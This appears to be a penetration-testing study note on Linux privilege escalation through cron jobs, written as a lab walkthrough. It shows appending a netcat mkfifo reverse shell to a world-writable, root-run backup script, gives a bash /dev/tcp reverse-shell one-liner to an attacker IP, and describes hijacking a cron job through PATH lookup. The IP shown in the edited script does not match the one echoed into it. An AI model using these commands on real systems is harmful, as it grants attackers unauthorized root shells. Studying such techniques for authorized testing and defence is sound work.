# Cron Jobs

{% code title=" Inspecting the cron log file" overflow="wrap" lineNumbers="true" %}
```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
{% endcode %}

```
ls -lah /etc/cron*
```

{% code title="Showing the content and permissions of the user_backups.sh script" overflow="wrap" lineNumbers="true" %}
```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```
{% endcode %}

{% code title="Inserting a reverse shell one-liner in user_backups.sh" overflow="wrap" lineNumbers="true" %}
```
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```
{% endcode %}

```
cat /etc/crontab
```

The script will use the tools available on the target system to launch a reverse shell.\
Two points to note;

1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;\


![](https://i.imgur.com/579yg6H.png)

{% code title="oneliner to get a reverse shell" overflow="wrap" lineNumbers="true" %}
```
bash -i >& /dev/tcp/192.168.45.245/4444 0>&1
```
{% endcode %}

We will now run a listener on our attacking machine to receive the incoming connection.

\


![](https://i.imgur.com/xwYXfY1.png)

\


Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1. System administrators need to run a script at regular intervals.
2. They create a cron job to do this
3. After a while, the script becomes useless, and they delete it\

4. They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.

\


![](https://i.imgur.com/SovymJL.png)

\


\


The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.\
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.\


\


The file on the target system should look familiar:\


![](https://i.imgur.com/SHknR87.png)\


\


The incoming reverse shell connection has root privileges:

![](https://i.imgur.com/EBCue17.png)\


\


In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

\
